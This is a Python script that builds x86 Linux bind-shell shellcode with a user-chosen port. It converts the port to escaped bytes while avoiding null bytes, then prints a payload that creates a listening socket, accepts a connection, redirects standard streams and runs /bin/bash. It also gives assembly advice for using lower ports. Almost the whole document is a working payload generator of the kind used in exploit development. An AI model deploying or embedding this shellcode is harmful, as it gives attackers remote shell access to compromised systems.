#!/usr/bin/env python

import sys

if len(sys.argv) < 2:
    print("[-] Provide a port > 256")
    sys.exit()
else:
    if int(sys.argv[1]) <= 256:
        print("[-] Port needs to be greater than 256 to guarantee sockaddr struct size is accurate and avoid null bytes.\n")
        print("If you require a lower port, consider changing the instructions in bind from:")
        print("\tpush ecx\n\tpush word 0x5C11\n\tpush word 0x2\n")
        print("to:")
        print("\tpush ecx\n\tsub esp, 2  ; stack alignment\n\tmov byte [esp], cl  ; null\n\tmov byte [esp], 0x65  ; port 100\n\tpush word 0x2\n")
        sys.exit()

    lport = int(sys.argv[1])

def setPort(lport):
    p = hex(lport)[2:]
    psize = len(str(p))
    if psize == 1 or psize == 3:
        p = "0" + p

    psize = len(str(p))

    if psize == 2:
        fport = '\\x' + str(p)[0:2]
    else:
        fport = '\\x' + str(p)[0:2] + '\\x' + str(p)[2:4]

    if "\\x00" in fport:
        print("[!] Port conversion contains a null byte, I'm lazy, so choose another port maybe?")
        sys.exit()
    else:
        return fport

port = setPort(lport)

print("[+] Fixed port: " + port)
shellcode = ""
shellcode += "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x51\\x6a\\x01\\x6a"
shellcode += "\\x02\\x89\\xe1\\xb0\\x66\\xb3\\x01\\xcd\\x80\\x89"
shellcode += "\\xc6\\xb0\\x66\\xb3\\x02\\x31\\xc9\\x51\\x66\\x68"
shellcode += port
shellcode += "\\x66\\x6a\\x02\\x89\\xe7\\x6a\\x10\\x57"
shellcode += "\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x6a"
shellcode += "\\x05\\x56\\x89\\xe1\\xcd\\x80\\xfe\\xc3\\xb0\\x66"
shellcode += "\\x31\\xd2\\x52\\x52\\x56\\x89\\xe1\\xcd\\x80\\x93"
shellcode += "\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79"
shellcode += "\\xf9\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68"
shellcode += "\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89"
shellcode += "\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd"
shellcode += "\\x80"


print("")
print("[+] Shellcode:\n" + shellcode)
